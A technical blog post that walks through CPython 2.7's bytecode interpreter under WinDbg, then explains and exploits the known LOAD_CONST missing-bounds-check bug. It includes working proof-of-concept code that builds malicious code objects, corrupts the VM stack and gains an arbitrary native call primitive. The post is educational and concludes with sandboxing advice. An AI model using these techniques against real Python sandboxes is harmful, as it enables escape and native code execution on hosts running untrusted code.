---
layout: post
title: "Deep dive into Python's VM: Story of LOAD_CONST bug"
date: 2014-04-17 23:22
comments: true
categories: [python, virtual machine]
author: Axel "0vercl0k" Souchet
published: true
---
# Introduction #
A year ago, I've written a Python script to leverage a bug in Python's virtual machine: the idea was to fully control the Python virtual processor and after that to instrument the VM to execute native codes. The [python27_abuse_vm_to_execute_x86_code.py](https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py) script wasn't really self-explanatory, so I believe only a few people actually took some time to understood what happened under the hood. The purpose of this post is to give you an explanation of the bug, how you can control the VM and how you can turn the bug into something that can be more useful. It's also a cool occasion to see how works the Python virtual machine from a low-level perspective: what we love so much right?

But before going further, I just would like to clarify a couple of things:

* I haven't found this bug, this is quite old and **known** by the Python developers (trading safety for performance), so don't panic this is **not** a 0day or a new bug ; can be a cool CTF trick though
* Obviously, YES I know we can also "escape" the virtual machine with the [ctypes](http://docs.python.org/2/library/ctypes.html) module ; but this is a feature not a bug. In addition, ctypes is always "removed"  from sandbox implementation in Python

Also, keep in mind I will focus Python 2.7.5 x86 on Windows ; but obviously this is adaptable for other systems and architectures, so this is left as an exercise to the interested readers.
All right, let's move on to the first part: this one will focus the essentials about the VM, and Python objects.

<!--more-->

# The Python virtual processor #
## Introduction
As you know, Python is a (really cool) scripting language interpreted, and the source of the official interpreter is available here: [Python-2.7.6.tgz](http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tgz). The project is written in C, and it is really readable ; so please download the sources, read them, you will learn a lot of things.
Now all the Python code you write is being *compiled*, at some point, into some "bytecodes": let's say it's exactly the same when your C codes are compiled into x86 code. But the cool thing for us, is that the Python architecture is far more simpler than x86.

Here is a partial list of all available opcodes in Python 2.7.5:

```text Python275 available opcodes
In [5]: len(opcode.opmap.keys())
Out[5]: 119
In [4]: opcode.opmap.keys()
Out[4]: [
 'CALL_FUNCTION',
 'DUP_TOP',
 'INPLACE_FLOOR_DIVIDE',
 'MAP_ADD',
 'BINARY_XOR',
 'END_FINALLY',
 'RETURN_VALUE',
 'POP_BLOCK',
 'SETUP_LOOP',
 'BUILD_SET',
 'POP_TOP',
 'EXTENDED_ARG',
 'SETUP_FINALLY',
 'INPLACE_TRUE_DIVIDE',
 'CALL_FUNCTION_KW',
 'INPLACE_AND',
 'SETUP_EXCEPT',
 'STORE_NAME',
 'IMPORT_NAME',
 'LOAD_GLOBAL',
 'LOAD_NAME',
 ...
]
```

## The virtual machine
The Python VM is fully implemented in the function [PyEval_EvalFrameEx](https://github.com/python-git/python/blob/master/Python/ceval.c#L667) that you can find in the [ceval.c](https://github.com/python-git/python/blob/master/Python/ceval.c) file. The machine is built with a simple loop handling opcodes one-by-one with a bunch of switch-cases:

```c Python VM
PyObject *
PyEval_EvalFrameEx(PyFrameObject *f, int throwflag)
{
  //...
  fast_next_opcode:
  //...
  /* Extract opcode and argument */
  opcode = NEXTOP();
  oparg = 0;
  if (HAS_ARG(opcode))
    oparg = NEXTARG();
  //...
  switch (opcode)
  {
    case NOP:
      goto fast_next_opcode;

    case LOAD_FAST:
      x = GETLOCAL(oparg);
      if (x != NULL) {
        Py_INCREF(x);
        PUSH(x);
        goto fast_next_opcode;
      }
      format_exc_check_arg(PyExc_UnboundLocalError,
        UNBOUNDLOCAL_ERROR_MSG,
        PyTuple_GetItem(co->co_varnames, oparg));
      break;

    case LOAD_CONST:
      x = GETITEM(consts, oparg);
      Py_INCREF(x);
      PUSH(x);
      goto fast_next_opcode;

    case STORE_FAST:
      v = POP();
      SETLOCAL(oparg, v);
      goto fast_next_opcode;

    //...
  }
```

The machine also uses a virtual stack to pass/return object to the different opcodes. So it really looks like an architecture we are used to dealing with, nothing exotic.

## Everything is an object
The first rule of the VM is that it handles only Python objects. A Python object is basically made of two parts:

* The first one is a header, this header is mandatory for all the objects. Defined like that:

```c Python object header
#define PyObject_HEAD                   \
  _PyObject_HEAD_EXTRA                \
  Py_ssize_t ob_refcnt;               \
  struct _typeobject *ob_type;

#define PyObject_VAR_HEAD               \
  PyObject_HEAD                       \
  Py_ssize_t ob_size; /* Number of items in variable part */
```

* The second one is the variable part that describes the specifics of your object. Here is for example *PyStringObject*:

```c PyStringObject
typedef struct {
  PyObject_VAR_HEAD
  long ob_shash;
  int ob_sstate;
  char ob_sval[1];

  /* Invariants:
   *     ob_sval contains space for 'ob_size+1' elements.
   *     ob_sval[ob_size] == 0.
   *     ob_shash is the hash of the string or -1 if not computed yet.
   *     ob_sstate != 0 iff the string object is in stringobject.c's
   *       'interned' dictionary; in this case the two references
   *       from 'interned' to this object are *not counted* in ob_refcnt.
   */
} PyStringObject;
```

Now, some of you may ask themselves "How does Python know the type of an object when it receives a pointer ?". In fact, this is exactly the role of the field *ob_type*. Python exports a *_typeobject* static variable that describes the type of the object. Here is, for instance the *PyString_Type*:

```c PyString_Type
PyTypeObject PyString_Type = {
  PyVarObject_HEAD_INIT(&PyType_Type, 0)
  "str",
  PyStringObject_SIZE,
  sizeof(char),
  string_dealloc,                             /* tp_dealloc */
  (printfunc)string_print,                    /* tp_print */
  0,                                          /* tp_getattr */
  // ...
};
```

Basically, every string objects will have their *ob_type* fields pointing to that *PyString_Type* variable. With this cute little trick, Python is able to do type checking like that:

```c PyString_Check PyString_CheckExact
#define Py_TYPE(ob)             (((PyObject*)(ob))->ob_type)
#define PyType_HasFeature(t,f)  (((t)->tp_flags & (f)) != 0)
#define PyType_FastSubclass(t,f)  PyType_HasFeature(t,f)

#define PyString_Check(op) \
  PyType_FastSubclass(Py_TYPE(op), Py_TPFLAGS_STRING_SUBCLASS)

#define PyString_CheckExact(op) (Py_TYPE(op) == &PyString_Type)
```

With the previous tricks, and the *PyObject* type defined as follow, Python is able to handle in a generic-fashion the different objects:
```c PyObject
typedef struct _object {
  PyObject_HEAD
} PyObject;
```

So when you are in your debugger and you want to know what type of object it is, you can use that field to identify easily the type of the object you are dealing with:

```text ob_type really useful when debugging
0:000> dps 026233b0 l2
026233b0  00000001
026233b4  1e226798 python27!PyString_Type
```

Once you have done that, you can dump the variable part describing your object to extract the information you want.
By the way, all the native objects are implemented in the [Objects/](https://github.com/python-git/python/tree/master/Objects) directory.

### Debugging session: stepping the VM. The hard way.
It's time for us to go a little bit deeper, at the assembly level, where we belong ; so let's define a dummy function like this one:

```python dummy function
def a(b, c):
  return b + c
```

Now using the Python's [dis](http://docs.python.org/2/library/dis.html) module, we can disassemble the function object *a*:

```text disassemble a
In [20]: dis.dis(a)
2   0 LOAD_FAST                0 (b)
    3 LOAD_FAST                1 (c)
    6 BINARY_ADD
    7 RETURN_VALUE
In [21]: a.func_code.co_code
In [22]: print ''.join('\\x%.2x' % ord(i) for i in a.__code__.co_code)
\x7c\x00\x00\x7c\x01\x00\x17\x53

In [23]: opcode.opname[0x7c]
Out[23]: 'LOAD_FAST'
In [24]: opcode.opname[0x17]
Out[24]: 'BINARY_ADD'
In [25]: opcode.opname[0x53]
Out[25]: 'RETURN_VALUE'
```

Keep in mind, as we said earlier, that everything is an object ; so a function is an object, and bytecode is an object as well:

```c PyFunctionObject PyCodeObject
typedef struct {
  PyObject_HEAD
  PyObject *func_code;  /* A code object */
  // ...
} PyFunctionObject;
/* Bytecode object */
typedef struct {
    PyObject_HEAD
    //...
    PyObject *co_code;    /* instruction opcodes */
    //...
} PyCodeObject;
```

Time to attach my debugger to the interpreter to see what's going on in that weird-machine, and to place a conditional breakpoint on [PyEval_EvalFrameEx](https://github.com/python-git/python/blob/master/Python/ceval.c#L667).
Once you did that, you can call the dummy function:

```text windbg breakpoint
0:000> bp python27!PyEval_EvalFrameEx+0x2b2 ".if(poi(ecx+4) == 0x53170001){}.else{g}"
breakpoint 0 redefined
0:000> g
eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c

0:000> db ecx l8
025ea914  7c 00 00 7c 01 00 17 53                          |..|...S
```

OK perfect, we are in the middle of the VM, and our function is being evaluated. The register *ECX* points to the bytecode being evaluated, and the first opcode is *LOAD_FAST*.

Basically, this opcode takes an object in the *fastlocals* array, and push it on the virtual stack. In our case, as we saw in both the disassembly and the bytecode dump, we are going to load the index 0 (the argument *b*), then the index 1 (argument *c*).

Here's what it looks like in the debugger ; first step is to load the *LOAD_FAST* opcode:

```text fetching the LOAD_FAST opcode
0:000>
eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
```

In *ECX* we have a pointer onto the opcodes of the function being evaluated, our dummy function. *0x7c* is the value of the *LOAD_FAST* opcode as we can see:

```c LOAD_FAST
#define LOAD_FAST 124 /* Local variable number */
```

Then, the function needs to check if the opcode has argument or not, and that's done by comparing the opcode with a constant value called *HAVE_ARGUMENT*:

```text Checking if the opcode has an argument
0:000>
eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
eip=1e0ec568 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b8:
1e0ec568 83f85a          cmp     eax,5Ah
```

Again, we can verify the value to be sure we understand what we are doing:

```python opcode.HAVE_ARGUMENT
In [11]: '%x' % opcode.HAVE_ARGUMENT
Out[11]: '5a'
```

```c HAS_ARG
#define HAS_ARG(op) ((op) >= HAVE_ARGUMENT)
```

If the opcode has an argument, the function needs to retrieve it (it's one byte):

```text Fetching the argument
0:000>
eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
eip=1e0ec571 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206
python27!PyEval_EvalFrameEx+0x2c1:
1e0ec571 0fb67901        movzx   edi,byte ptr [ecx+1]       ds:002b:025ea916=00
```

As expected for the first *LOAD_FAST* the argument is *0x00*, perfect.
After that the function dispatches the execution flow to the *LOAD_FAST* case defined as follow:

```c LOAD_FAST definition
#define GETLOCAL(i)     (fastlocals[i])
#define Py_INCREF(op) (                         \
    _Py_INC_REFTOTAL  _Py_REF_DEBUG_COMMA       \
    ((PyObject*)(op))->ob_refcnt++)
#define PUSH(v)                BASIC_PUSH(v)
#define BASIC_PUSH(v)     (*stack_pointer++ = (v))

case LOAD_FAST:
  x = GETLOCAL(oparg);
  if (x != NULL) {
    Py_INCREF(x);
    PUSH(x);
    goto fast_next_opcode;
  }
  //...
  break;
```

Let's see what it looks like in assembly:

```text Loads the fastlocals array (026bef98)
0:000>
eax=0000007c ebx=00000000 ecx=0000007b edx=00000059 esi=1e222c0c edi=00000000
eip=1e0ec5cf esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
python27!PyEval_EvalFrameEx+0x31f:
1e0ec5cf 8b54246c        mov     edx,dword ptr [esp+6Ch] ss:002b:0027fd44=98ef6b02
```

After getting the *fastlocals*, we can retrieve an entry:

```text Retrieve the entry 0 of the fastlocals array
0:000>
eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=1e222c0c edi=00000000
eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
python27!PyEval_EvalFrameEx+0x323:
1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d0=a0aa5e02
```

Also keep in mind we called our dummy function with two strings, so let's actually check it is a string object:

```text Type checking
0:000> dps 025eaaa0 l2
025eaaa0  00000004
025eaaa4  1e226798 python27!PyString_Type
```

Perfect, now according to the definition of *PyStringObject*:

```c PyStringObject
typedef struct {
    PyObject_VAR_HEAD
    long ob_shash;
    int ob_sstate;
    char ob_sval[1];
} PyStringObject;
```

We should find the content of the string directly in the object:

```text Finding the string in the PyStringObject
0:000> db 025eaaa0 l1f
025eaaa0  04 00 00 00 98 67 22 1e-05 00 00 00 dd 16 30 43  .....g".......0C
025eaab0  01 00 00 00 48 65 6c 6c-6f 00 00 00 ff ff ff     ....Hello......
```

Awesome, we have the size of the string at the offset *0x8*, and the actual string is at *0x14*.

Let's move on to the second opcode now, this time with less details though:

```text Fetching the second LOAD_FAST opcode
0:000> 
eax=0000007c ebx=00000000 ecx=025ea917 edx=026bef98 esi=025eaaa0 edi=00000000
eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea917=7c
```

This time, we are loading the second argument, so the index 1 of *fastlocals*.
We can type-check the object and dump the string stored in it:

```text Retrieving the index 1 of fastlocals (025ea9c0)
0:000> 
eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=025eaaa0 edi=00000001
eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
python27!PyEval_EvalFrameEx+0x323:
1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d4=c0af5e02
0:000> db poi(026bf0d4) l1f
025eafc0  04 00 00 00 98 67 22 1e-05 00 00 00 39 4a 25 29  .....g".....9J%)
025eafd0  01 00 00 00 57 6f 72 6c-64 00 5e 02 79 00 00     ....World.^.y..
```

Comes now the *BINARY_ADD* opcode:

```text Fetching the BINARY_ADD opcode
0:000> 
eax=0000007c ebx=00000000 ecx=025ea91a edx=026bef98 esi=025eafc0 edi=00000001
eip=1e0ec562 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91a=17
```

Here it's supposed to retrieve the two objects on the top-of-stack, and add them.
The C code looks like this:

```c BINARY_ADD
#define SET_TOP(v)        (stack_pointer[-1] = (v))

case BINARY_ADD:
  w = POP();
  v = TOP();
  if (PyInt_CheckExact(v) && PyInt_CheckExact(w)) {
    // Not our case
  }
  else if (PyString_CheckExact(v) &&
           PyString_CheckExact(w)) {
      x = string_concatenate(v, w, f, next_instr);
      /* string_concatenate consumed the ref to v */
      goto skip_decref_vx;
  }
  else {
    // Not our case
  }
  Py_DECREF(v);
skip_decref_vx:
  Py_DECREF(w);
  SET_TOP(x);
  if (x != NULL) continue;
  break;
```

And here is the assembly version where it retrieves the two objects from the top-of-stack:

```text POP and TOP
0:000> 
eax=00000017 ebx=00000000 ecx=00000016 edx=0000000f esi=025eafc0 edi=00000000
eip=1e0eccf5 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
python27!PyEval_EvalFrameEx+0xa45:
1e0eccf5 8b75f8          mov     esi,dword ptr [ebp-8] ss:002b:026bf0d8=a0aa5e02
...
0:000> 
eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=00000000
eip=1e0eccfb esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
python27!PyEval_EvalFrameEx+0xa4b:
1e0eccfb 8b7dfc          mov     edi,dword ptr [ebp-4] ss:002b:026bf0dc=c0af5e02
0:000> 
eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=025eafc0
eip=1e0eccfe esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
python27!PyEval_EvalFrameEx+0xa4e:
1e0eccfe 83ed04          sub     ebp,4
```

A bit further we have our string concatenation:

```text String concatenation in string_concatenate
0:000> 
eax=025eafc0 ebx=00000000 ecx=0027fcd0 edx=026bef98 esi=025eaaa0 edi=025eafc0
eip=1e0eb733 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
python27!PyEval_SliceIndex+0x813:
1e0eb733 e83881fcff      call    python27!PyString_Concat (1e0b3870)
0:000> dd esp l3
0027fcb8  0027fcd0 025eafc0 025eaaa0
0:000> p
eax=025eaaa0 ebx=00000000 ecx=00000064 edx=000004fb esi=025eaaa0 edi=025eafc0
eip=1e0eb738 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
python27!PyEval_SliceIndex+0x818:
1e0eb738 8b442418        mov     eax,dword ptr [esp+18h] ss:002b:0027fcd0=c0aa5e02
0:000> db poi(0027fcd0) l1f
025eaac0  01 00 00 00 98 67 22 1e-0a 00 00 00 ff ff ff ff  .....g".........
025eaad0  00 00 00 00 48 65 6c 6c-6f 57 6f 72 6c 64 00     ....HelloWorld.
```

And the last part of the case is to push the resulting string onto the virtual stack (*SET_TOP* operation):

```text Push the resulting object onto the virtual stack
0:000> 
eax=025eaac0 ebx=025eaac0 ecx=00000005 edx=000004fb esi=025eaaa0 edi=025eafc0
eip=1e0ecb82 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200213
python27!PyEval_EvalFrameEx+0x8d2:
1e0ecb82 895dfc          mov     dword ptr [ebp-4],ebx ss:002b:026bf0d8=a0aa5e02
```

Last part of our deep dive, the *RETURN_VALUE* opcode:

```text Fetching the RETURN_VALUE opcode
0:000> 
eax=025eaac0 ebx=025eafc0 ecx=025ea91b edx=026bef98 esi=025eaac0 edi=025eafc0
eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
python27!PyEval_EvalFrameEx+0x2b2:
1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91b=53
```

All right, at least now you have a more precise idea about how that Python virtual machine works, and more importantly how you can directly debug it without symbols. Of course, you can download the debug symbols on Linux and use that information in gdb ; it should make your life easier (....but I hate gdb man...).

Note that I would love very much to have a debugger at the Python bytecode level, it would be much easier than instrumenting the interpreter. If you know one ping me! If you build one ping me too :-).

# The bug #
Here is the bug, spot it and give it some love:

```c LOAD_CONST bug
#ifndef Py_DEBUG
#define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))
#else
//...
/* Macro, trading safety for speed <-- LOL, :) */ 
#define PyTuple_GET_ITEM(op, i) (((PyTupleObject *)(op))->ob_item[i])

case LOAD_CONST:
  x = GETITEM(consts, oparg);
  Py_INCREF(x);
  PUSH(x);
  goto fast_next_opcode;
```

This may be a bit obscure for you, but keep in mind we control the index *oparg* and the content of *consts*. That means we can just push *untrusted* data on the virtual stack of the VM: brilliant. Getting a crash out of this bug is fairly easy, try to run these lines (on a Python 2.7 distribution):

```python craaaaash
import opcode
import types

def a():
  pass

a.func_code = types.CodeType(
  0, 0, 0, 0,
  chr(opcode.opmap['EXTENDED_ARG']) + '\xef\xbe' +
  chr(opcode.opmap['LOAD_CONST'])   + '\xad\xde',
  (), (), (), '', '', 0, ''
)
a()
```

..and as expected you get a fault (*oparg* is *edi*):

```text craaaaaaash
(2058.2108): Access violation - code c0000005 (!!! second chance !!!)
[...]
eax=01cb1030 ebx=00000000 ecx=00000063 edx=00000046 esi=1e222c0c edi=beefdead
eip=1e0ec5f7 esp=0027e7f8 ebp=0273a9f0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
python27!PyEval_EvalFrameEx+0x347:
1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????
```

By the way, some readers might have caught the same type of bug in *LOAD_FAST* with the *fastlocals* array ; those readers are definitely right :).

# Walking through the PoC #
OK, so if you look only at the faulting instruction you could say that the bug is minor and we won't be able to turn it into something "useful". But the essential piece when you want to exploit a software is to actually completely understand how it works. Then you are more capable of turning bugs that seems useless into interesting primitives.

As we said several times, from Python code you can't really push any value you want onto the Python virtual stack, obviously. The machine is only dealing with Python objects. However with this bug we can corrupt the virtual stack by pushing arbitrary data that we control. If you do that well, you can end up causing the Python VM to call whatever address you want. That's exactly what I did back when I wrote [python27_abuse_vm_to_execute_x86_code.py](https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py).

In Python we are really lucky because we can control a lot of things in memory and we have natively a way to "leak" (I shouldn't call that a leak though because it's a feature) the address of a Python object with the function *id*. So basically we can do stuff, we can do it reliably and we can manage to not break the interpreter, like bosses.

## Pushing attacker-controlled data on the virtual stack ##
We control *oparg* and the content of the tuple *consts*. We can also find out the address of that tuple. So we can have a Python string object that stores an arbitrary value, let's say *0xdeadbeef* and it will be pushed on the virtual stack.

Let's do that in Python now:

```python Pushing controlled value on the virtual stack
import opcode
import types
import struct

def pshort(s):
    return struct.pack('<H', s)

def a():
  pass

consts = ()
s = '\xef\xbe\xad\xde'
address_s = id(s) + 20 # 20 is the offset of the array of byte we control in the string
address_consts = id(consts)
# python27!PyEval_EvalFrameEx+0x347:
# 1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????
offset = ((address_s - address_consts - 0xC) / 4) & 0xffffffff
high = offset >> 16
low =  offset & 0xffff
print 'Consts tuple @%#.8x' % address_consts
print 'Address of controled data @%#.8x' % address_s
print 'Offset between const and our object: @%#.8x' % offset
print 'Going to push [%#.8x] on the virtual stack' % (address_consts + (address_s - address_consts - 0xC) + 0xc)

a.func_code = types.CodeType(
  0, 0, 0, 0,
  chr(opcode.opmap['EXTENDED_ARG']) + pshort(high) +
  chr(opcode.opmap['LOAD_CONST'])   + pshort(low),
  consts, (), (), '', '', 0, ''
)
a()
```

..annnnd..

```text debugger view
D:\>python 1.py
Consts tuple @0x01db1030
Address of controled data @0x022a0654
Offset between const and our object: @0x0013bd86
Going to push [0x022a0654] on the virtual stack

*JIT debugger pops*

eax=01db1030 ebx=00000000 ecx=00000063 edx=00000046 esi=deadbeef edi=0013bd86
eip=1e0ec5fb esp=0027fc68 ebp=01e63fc0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
python27!PyEval_EvalFrameEx+0x34b:
1e0ec5fb ff06            inc     dword ptr [esi]      ds:002b:deadbeef=????????
0:000> ub eip l1
python27!PyEval_EvalFrameEx+0x347:
1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch]
0:000> ? eax+edi*4+c
Evaluate expression: 36308564 = 022a0654
0:000> dd 022a0654 l1
022a0654  deadbeef <- the data we control in our PyStringObject
0:000> dps 022a0654-0n20 l2
022a0640  00000003
022a0644  1e226798 python27!PyString_Type
```
Perfect, we control a part of the virtual stack :).

## Game over, LOAD_FUNCTION

Once you control the virtual stack, the only limit is your imagination and the ability you have to find an interesting spot in the virtual machine. My idea was to use the *CALL_FUNCTION* opcode to craft a *PyFunctionObject* somehow, push it onto the virtual stack and to use the magic opcode. 

```c PyFunctionObject definition
typedef struct {
  PyObject_HEAD
  PyObject *func_code;  /* A code object */
  PyObject *func_globals; /* A dictionary (other mappings won't do) */
  PyObject *func_defaults;  /* NULL or a tuple */
  PyObject *func_closure; /* NULL or a tuple of cell objects */
  PyObject *func_doc;   /* The __doc__ attribute, can be anything */
  PyObject *func_name;  /* The __name__ attribute, a string object */
  PyObject *func_dict;  /* The __dict__ attribute, a dict or NULL */
  PyObject *func_weakreflist; /* List of weak references */
  PyObject *func_module;  /* The __module__ attribute, can be anything */
} PyFunctionObject;
```

The thing is, as we saw earlier, the virtual machine usually ensures the type of the object it handles. If the type checking fails, the function bails out and we are not happy, at all. It means we would need an information-leak to obtain a pointer to the PyFunction_Type static variable.

Fortunately for us, the CALL_FUNCTION can still be abused without knowing that magic pointer to craft correctly our object. Let's go over the source code to illustrate my sayings:

```c CALL_FUNCTION
case CALL_FUNCTION:
{
  PyObject **sp;
  PCALL(PCALL_ALL);
  sp = stack_pointer;
  x = call_function(&sp, oparg);

static PyObject *
call_function(PyObject ***pp_stack, int oparg)
{
  int na = oparg & 0xff;
  int nk = (oparg>>8) & 0xff;
  int n = na + 2 * nk;
  PyObject **pfunc = (*pp_stack) - n - 1;
  PyObject *func = *pfunc;
  PyObject *x, *w;

  if (PyCFunction_Check(func) && nk == 0) {
    // ..Nope..
  } else {
    if (PyMethod_Check(func) && PyMethod_GET_SELF(func) != NULL) {
      // ..Still Nope...
    } else
    if (PyFunction_Check(func))
      // Nope!
    else
      x = do_call(func, pp_stack, na, nk);

static PyObject *
do_call(PyObject *func, PyObject ***pp_stack, int na, int nk)
{
  // ...
  if (PyCFunction_Check(func)) {
    // Nope
  }
  else
    result = PyObject_Call(func, callargs, kwdict);

PyObject *
PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw)
{
  ternaryfunc call;

  if ((call = func->ob_type->tp_call) != NULL) {
    PyObject *result;
    // Yay an interesting call :)
    result = (*call)(func, arg, kw);
```

So basically the idea to use *CALL_FUNCTION* was a good one, but we will need to craft two different objects:

1. The first one will be a *PyObject* with *ob_type* pointing to the second object
2. The second object will be a *_typeobject* with *tp_call* the address you want to call

This is fairly trivial to do and will give us an absolute-call primitive without crashing the interpreter: s.w.e.e.t.

```python absolute call via CALL_FUNCTION
import opcode
import types
import struct

def pshort(s):
  return struct.pack('<H', s)

def puint(s):
  return struct.pack('<I', s)

def a():
  pass

PyStringObject_to_char_array_offset = 20
second_object = 'A' * 0x40 + puint(0xdeadbeef)
addr_second_object = id(second_object)
addr_second_object_controled_data = addr_second_object + PyStringObject_to_char_array_offset

first_object = 'AAAA' + puint(addr_second_object_controled_data)
addr_first_object = id(first_object)
addr_first_object_controled_data = addr_first_object + PyStringObject_to_char_array_offset

consts = ()
s = puint(addr_first_object_controled_data)
address_s = id(s) + PyStringObject_to_char_array_offset
address_consts = id(consts)
offset = ((address_s - address_consts - 0xC) / 4) & 0xffffffff

a.func_code = types.CodeType(
  0, 0, 0, 0,
  chr(opcode.opmap['EXTENDED_ARG'])  + pshort(offset >> 16)     +
  chr(opcode.opmap['LOAD_CONST'])    + pshort(offset & 0xffff)  +
  chr(opcode.opmap['CALL_FUNCTION']) + pshort(0),
  consts, (), (), '', '', 0, ''
)
a()
```

And we finally get our primitive working :-)

```text call 0xdeadbeef
(11d0.11cc): Access violation - code c0000005 (!!! second chance !!!)
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Python\Python275\python27.dll - 
eax=01cc1030 ebx=00000000 ecx=00422e78 edx=00000000 esi=deadbeef edi=02e62df4
eip=deadbeef esp=0027e78c ebp=02e62df4 iopl=0         nv up ei ng nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
deadbeef ??              ???
```

So now you know all the nasty things going under the hood with that [python27_abuse_vm_to_execute_x86_code.py](https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py) script!

# Conclusion, Ideas #
After reading this little post you are now aware that if you want to sandbox efficiently Python, you should do it outside of Python and not by preventing the use of some modules or things like that: this is broken by design. The virtual machine is not safe enough to build a strong sandbox inside Python, so don't rely on such thing if you don't want to get surprised. An article about that exact same thing was written here if you are interested: [The failure of pysandbox](https://lwn.net/Articles/574215/).

You also may want to look at [PyPy's sandboxing capability](http://pypy.org/features.html#sandboxing) if you are interested in executing untrusted Python code. Otherwise, you can build your own [SECCOMP](https://code.google.com/p/seccompsandbox/wiki/overview)-based system :).

On the other hand, I had a lot of fun taking a deep dive into Python's source code and I hope you had some too! If you would like to know more about the low level aspects of Python here are a list of interesting posts:

 * [Debugging Your Python With GDB (FTW!)](http://www.jmcneil.net/2012/04/debugging-your-python-with-gdb-ftw/)
 * [The structure of .pyc files](http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html)
 * [Bytecode: What, Why, and How to Hack it - Dr. Ryan F Kelly](https://www.youtube.com/watch?v=ve7lLHtJ9l8)
 * [Self-modifying Python bytecode](https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/wildfire.py)
 * [Python internals series](http://eli.thegreenplace.net/category/programming/python/python-internals/)

Folks, that's all for today ; don't hesitate to contact us if you have a cool post!
